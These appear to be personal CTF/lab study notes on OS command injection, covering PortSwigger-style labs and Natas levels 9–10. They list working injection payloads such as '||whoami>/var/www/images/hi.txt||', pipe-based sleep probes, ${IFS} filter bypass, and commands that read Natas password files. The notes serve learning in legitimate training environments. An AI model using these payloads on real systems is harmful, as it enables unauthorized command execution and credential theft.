# OS Injection

## We Know

Using `; & &&` with URL encoding

`${IFS}` to bypass whitespace filter and curly brace expansion

### Lab 2

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`||` is conditional if right but why use it at the end of the command as well?

Well `||sleep 10;` works but we get a 500 Server Error

`|sleep 10|` too

`;sleep 10` doesn't work so `|` is the only operator that breaks the flow

`&` and `&&` doesn't work at all so ggs

### Lab 3

`||whoami>/var/www/images/hi.txt||`

`/image?filename=hi.txt`

The writable folder, we found cus of these boys - how else would we know?

<div align="left"><figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>

{% embed url="https://github.com/payloadbox/command-injection-payload-list" %}

## Natas

### 9 & 10

<div align="left"><figure><img src="../../.gitbook/assets/image (83).png" alt="" width="417"><figcaption></figcaption></figure></div>

In prev challenge we executed multiple commands in the same line using ;

`; cat /etc/natas_webpass/natas10`

but as we can see the ; is blocked here so what do.

the other standard ways of exec multiple commands include &&, || and those are blocked too.

```
.* /etc/natas_webpass/natas11
```

so `grep -i .* /etc/natas_webpass/natas11 dictionary.txt` is the final output

I've never seen this before nor does this show up in any forums so how legit is this?

This .\* is specific for grep to read the contents of a file.
